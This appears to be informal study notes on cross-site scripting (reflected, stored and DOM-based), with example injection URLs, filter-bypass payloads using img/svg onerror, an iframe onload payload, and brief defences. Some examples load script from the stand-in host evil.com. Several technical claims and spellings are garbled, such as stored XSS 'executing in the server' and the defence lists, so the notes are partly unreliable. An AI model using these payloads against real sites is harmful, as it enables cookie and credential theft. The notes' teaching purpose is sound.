# output

## What is cross site scripting (XSS)

A vulnerable web application allows the attacker to send malicious code to the victim, which results in cookie theft, password theft, and sensitive data theft.

The attacker tricks the web application into returning malicious code to the victim browser.

## JavaScript

JavaScript is the front-end language which handles the action parts.

## How does it work

A vulnerable web application is tricked by the attacker into returning the malicious code to the user. Then the user executes the malicious code, which can result in cookie theft, sensitive data theft, or a compromised system.

## Types of XSS

* **Reflected XSS:** when the malicious code request comes from the current HTTP request.
* **Stored XSS:** when the malicious code request comes from the database.
* **DOM Based XSS:** when the vulnerability is in client-side code.

## Reflected XSS

Allows execution of malicious code in a web application input parameter such as a search bar, and the web application executes the malicious code in the browser.

### What is reflected XSS

* When the application has an input parameter where the user request and response are reflected.
*   Like:

    ```
    https://amazon.in/shopping/laptop=?hp
    ```
* Where the `hp` is reflected in the response.
* Assuming the web application is vulnerable, the attacker tricks the web application or adds malicious code.
*   Like:

    ```
    https://amazon.in/shopping/laptop=?hp%3cscirpt%3ehttps://evil.com/badcode.js%3c/scirpt)>
    ```

### Impact of Reflected XSS

* Break the CIA
* Sensitive data stolen (PII, Password)

This leads to the user cookie or sensitive data being stolen.

The malicious code is not stored or executed in the server; it is returned to the browser, and the browser executes it.

The browser should validate and sanitize the input data.

Reflected XSS is cooler because it targets a random user and exploits the trust of the web application.

### Blackbox Reflected XSS

* Check for reflected response from the web application.
* If it is reflected, then check the code for any defense coding.
* Use `ctrl + f` and check the reflected area.
* If it is in HTML tags, try to break out using existing tags and syntax like `>`, `"`, `'`, `</>` etc.
* Execute some JavaScript function like `alert` or `print` (it triggers the printing function for the user). Mostly `alert` is blocked from the browser end.
* The `script` word can be replaced with a space as input sanitization, which can be bypassed by using big letter `SCRIPT`.
* Closing tags and double quotes, which help in closing HTML tags, can be replaced with a space, which can be bypassed by using `<img src>` and `<svg>` tags with JavaScript functions like `onclick`, `onerror`, `onload`.
* Angle brackets HTML encoding breaks the code to view the quote, which is double or single, and then use `-` (hyphen) with JavaScript function: `[Hexruinx'-alert(1)-']`
* Angle brackets HTML double encoding breaks the code to view the quote, which is double or single. User input is output in single quote, and the backslash is output in double backslash. Using that to reflect JS: `\'-alert()//`

### Defences against Reflected XSS

* User validation and input sanitization is applied.
* CSP and other defence mechanism should be applied.
* Create a function which sanitized the code.
* Remove the `<script>` tags OR replace the `<script>` tags with URL encoding space `%020`.
* Remove the opening, closing, and brackets backslash OR replace the opening/closing bracket `<>` and backslash with URL encoding space `0%20`.
* AngularJS, innerhtml

## Stored XSS

The client browser sends malicious code to the server, which executes in the server and responds in the browser.

A vulnerable web application where comments and posts are available: the attacker uses that feature and posts malicious code, the server stores it, and when the user clicks the attacker post, that will compromise the user system.

### What is Stored XSS

* When the application has a store feature like comment or post.
*   Like:

    ```
    https://threads.com/comments=?normal+user+writing+comment
    ```
* Assuming the web application is vulnerable to stored XSS, the attacker tricks or adds malicious code in the web application.
*   Like:

    ```
    https://threads.com/comments=?normal+user+writing+comment%3cscript%3ehttps://evil.com%3c/scirpt
    ```
* After the malicious code is stored in the web application and the user clicks it, this can result in cookie theft or sensitive data theft.

### Impact of Stored XSS

* Break the CIA
* Sensitive data stolen (PII, Password)

### Blackbox Stored XSS

* Check the request and response for any defence headers.
* Fill all the input parameters and check the response in the source code.
* Check how the parameter is stored.
* Use `ctrl + f` and check the input parameters in the source code.
* If it is in HTML tags, try to break out using existing tags and syntax like `>`, `"`, `'`, `</>` etc.
* Execute some JavaScript function like `alert` or `print` (it triggers the printing function for the user). Mostly `alert` is blocked from the browser end.
* The `script` word can be replaced with a space as input sanitization, which can be bypassed by using big letter `SCRIPT`.
* Closing tags and double quotes, which help in closing HTML tags, can be replaced with a space, which can be bypassed by using `<img src>` and `<svg>` tags with JavaScript functions like `onclick`, `onerror`, `onload`.

### Defences against Stored XSS

* User validation and input sanitization is applied.
* CSP and other defence mechanism should be applied.

## DOM Based XSS

Document Object Model is the structure webpage of the source code.

An attacker inputs malicious code in the web application that the browser loads, which exploits the client browser.

### Example

A web application allows theme changes where the attacker inputs malicious code that is sent to the client and loaded by the client browser, resulting in compromise of the system or cookie theft.

### What is DOM

* Many websites have user input parameters which the attacker can trick into malicious code that exploits the client browser, resulting in cookie theft and more.
* There is a submit feature which uses JavaScript to submit the form.
*   Like:

    ```
    https://createprofile.com/lang=english
    ```
* Assuming the web application is vulnerable to DOM, the attacker used the `lang` JavaScript function English parameter into the malicious code in the web application.
*   Like:

    ```
    https://createprofile.com/lang=alert(1)
    ```

    to

    ```
    https://createprofile.com/lang=english%3cscript%3ealert(1)%3c/script
    ```

### Blackbox DOM XSS

* Check the request and response for any defence headers.
* Fill all the input parameters and check the response in the source code.
* Break the HTML using the closing tags or img tags inside JavaScript tags and JavaScript functions.
* Check where the script is where the HTML tags are called in the JavaScript.
* Get out of the HTML tag using `<img>` or `<svg>` with the `onerror` JavaScript function, which results in a load error on the browser and triggers `onerror` and the parameter after the `onerror` function.
*   If the iframe is used to get out of HTML tags:

    ```html
    <iframe src="https://website/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    ```

### Defence against DOM-Based XSS

* AnjularJS
* Innerhtml
